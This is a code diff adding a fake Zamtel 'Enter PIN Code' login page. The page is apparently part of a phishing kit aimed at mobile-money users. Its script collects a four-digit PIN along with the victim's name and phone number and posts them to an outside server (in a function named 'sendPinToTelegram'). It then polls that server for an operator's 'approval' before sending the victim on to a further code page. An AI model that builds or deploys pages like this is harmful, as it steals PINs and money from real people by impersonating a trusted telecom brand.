@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Zamtel | Enter PIN Code</title>
+
+<style>
+*{ margin:0; padding:0; box-sizing:border-box; }
+
+body{
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+  background:#f2f2f2;
+  min-height:100vh;
+}
+
+.container{
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+  padding:20px;
+}
+
+.upper-section{
+  width:100%;
+  max-width:360px;
+  text-align:center;
+}
+
+.brand-name{
+  font-size:42px;
+  font-weight:600;
+  color:#00843d;
+  margin-bottom:12px;
+}
+
+.welcome-text{
+  font-size:22px;
+  color:#555;
+  margin-bottom:18px;
+}
+
+.pin-label{
+  font-size:17px;
+  color:#666;
+  margin-bottom:18px;
+}
+
+.pin-boxes{
+  display:flex;
+  justify-content:center;
+  gap:14px;
+  margin-bottom:16px;
+}
+
+.pin-boxes input{
+  width:58px;
+  height:58px;
+  border:2px solid #00843d;
+  border-radius:12px;
+  font-size:24px;
+  text-align:center;
+  outline:none;
+  background:#fff;
+}
+
+#status{
+  font-size:14px;
+  color:#00843d;
+  margin-top:8px;
+  min-height:18px;
+}
+
+.lower-section{
+  width:100%;
+  max-width:360px;
+  text-align:center;
+  margin-top:28px;
+}
+
+.action-buttons{
+  display:flex;
+  gap:12px;
+  justify-content:center;
+  margin-bottom:26px;
+}
+
+.action{
+  flex:1;
+  background:#00843d;
+  color:#fff;
+  padding:14px;
+  border-radius:10px;
+  font-weight:600;
+}
+
+.footer{
+  font-size:14px;
+  color:#666;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="upper-section">
+    <div class="brand-name">Zamtel</div>
+    <div class="welcome-text">Welcome</div>
+    <div class="pin-label">Enter your PIN code</div>
+
+    <div class="pin-boxes">
+      <input type="tel" maxlength="1">
+      <input type="tel" maxlength="1">
+      <input type="tel" maxlength="1">
+      <input type="tel" maxlength="1">
+    </div>
+
+    <div id="status"></div>
+  </div>
+
+  <div class="lower-section">
+    <div class="action-buttons">
+      <div class="action">Login</div>
+    </div>
+    <div class="footer">
+      By continuing, you agree to the terms and conditions
+    </div>
+  </div>
+
+</div>
+
+<script>
+const BACKEND_URL = "https://airtel-money-congo-xyki.onrender.com";
+
+const botId   = new URLSearchParams(window.location.search).get("botId");
+const boxes   = document.querySelectorAll(".pin-boxes input");
+const statusEl= document.getElementById("status");
+
+// Always read fresh from localStorage each time we send something
+function getIdentity(){
+  return {
+    name:  localStorage.getItem("name")  || "Unknown",
+    phone: localStorage.getItem("phone") || "Unknown"
+  };
+}
+
+async function sendPinToTelegram(name, phone, pin) {
+  try {
+    const res = await fetch(`${BACKEND_URL}/submit-pin`, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({ name, phone, pin, botId })
+    });
+    return res.json();
+  } catch {
+    return null;
+  }
+}
+
+async function pollPinApproval(requestId) {
+  return new Promise(resolve => {
+    const i = setInterval(async () => {
+      const { name, phone } = getIdentity();
+      const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`, {
+        method: "POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify({ name, phone, botId })
+      });
+      const d = await r.json();
+      if(d.approved === true || d.approved === false){
+        clearInterval(i);
+        resolve(d.approved);
+      }
+    },1500);
+  });
+}
+
+boxes.forEach((box,i)=>{
+  box.addEventListener("input", async ()=>{
+    box.value = box.value.replace(/[^0-9]/g,'');
+    if(box.value && i<3) boxes[i+1].focus();
+
+    if(i===3 && box.value){
+      let pin=""; boxes.forEach(b=>pin+=b.value);
+      localStorage.setItem("pin",pin);
+
+      const { name, phone } = getIdentity();   // fresh read every submit
+      boxes.forEach(b=>b.disabled=true);
+      statusEl.textContent="Sending PIN code...";
+
+      const res = await sendPinToTelegram(name, phone, pin);
+      if(!res||!res.requestId){
+        statusEl.textContent="Failed. Please try again.";
+        boxes.forEach(b=>{b.disabled=false;b.value="";});
+        boxes[0].focus(); return;
+      }
+
+      const ok = await pollPinApproval(res.requestId);
+      if(ok){
+        window.location.href = "code.html?botId=" + botId;
+      } else {
+        statusEl.textContent="Incorrect PIN code.";
+        boxes.forEach(b=>{b.disabled=false;b.value="";});
+        boxes[0].focus();
+      }
+    }
+  });
+
+  box.addEventListener("keydown",e=>{
+    if(e.key==="Backspace"&&!box.value&&i>0) boxes[i-1].focus();
+  });
+});
+boxes[0].focus();
+</script>
+
+</body>
+</html>
